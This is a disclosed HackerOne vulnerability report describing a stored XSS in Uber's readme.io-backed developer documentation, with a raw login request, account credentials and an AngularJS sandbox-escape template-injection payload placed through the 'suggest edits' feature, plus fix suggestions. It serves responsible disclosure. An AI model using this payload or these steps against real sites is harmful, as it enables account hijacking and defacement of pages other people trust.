---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '131450'
original_report_id: '131450'
title: Stored XSS in developer.uber.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: uber
created_at: '2016-04-16T22:25:38.643Z'
disclosed_at: '2016-06-27T12:37:42.236Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 214
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Stored XSS in developer.uber.com

## Metadata

- HackerOne Report ID: 131450
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: uber
- Disclosed At: 2016-06-27T12:37:42.236Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

An attacker can make a series of requests to https://uber.readme.io/ that will result in permanent defacement/stored XSS of all the documentation pages on https://developer.uber.com/

I'm not entirely sure if this is in scope, but it could definitely have a major impact on developer.uber.com so I figure you'd like to know either way. 


Reproduction steps:

Load https://uber.readme.io/docs/deep-linking to get a connect.sid cookie
Authenticate the session by sending the following request to uber.readme.io:
```
POST /users/session HTTP/1.1
Host: uber.readme.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 84
Cookie: YOUR CONNECT.SID COOKIE HERE
Connection: close
Pragma: no-cache
Cache-Control: no-cache

{"email":"readme2@thursday.eml.cc","password":"pjJnBODjkLFv!!11","action":"session"}
```

If this worked, you'll see a response body something like 
```
{"id":"57129b7365324b0e002ad83b","name":"James Kettle","email":"readme2@thursday.eml.cc","username":"","provider":"local","createdAt":"2016-04-16T20:07:15.871Z","accessToken":"","stripeId":"","hasStripe":false,"email_verified":false,"hasGithub":false,"github":{},"is_admin":false,"is_god":false}
```
Grab the new connect.sid cookie from this response.

Using the new connect.sid cookie value, load https://uber.readme.io/docs/deep-linking/edit - you should land on a 'Suggest edits' page (see screenshot)

Add the following payload into the document:
```{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}```
Then enter an arbitrary description then press 'suggest edits'. 

When an administrator next views the readme dashboard and clicks on the suggested edit, the injected JavaScript will execute (see screenshot). This JavaScript could automatically approve the suggestion.

Congrats, you've now got your own JavaScript executing on https://uber.readme.io/docs/deep-linking - potentially hijacking the account of every developer who views it. 

The obvious way to patch this is using the ng-nonbindable directive to nullify the stored-xss-via-suggested-edits problem. However, since readme.io appears to have a weak security posture, it may be worth considering shifting the readme.io-powered documentation to a separate domain from developer.uber.com, to ensure that XSS in readme.io can't hijack developer accounts.

Let me know if a video would be helpful.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
